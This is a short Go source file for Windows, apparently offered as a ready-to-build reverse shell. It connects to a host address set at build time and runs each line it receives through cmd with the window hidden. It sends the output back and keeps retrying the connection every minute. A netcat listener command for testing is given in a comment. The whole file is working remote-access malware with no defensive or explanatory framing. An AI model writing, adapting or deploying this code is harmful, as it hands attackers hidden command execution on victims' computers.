// +build windows

// Reverse Windows CMD
// Test with nc -lvvp 6666
package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

var address string

func main() {
	reverse(address)
}

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			reverse(host)
			return
		}

		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}
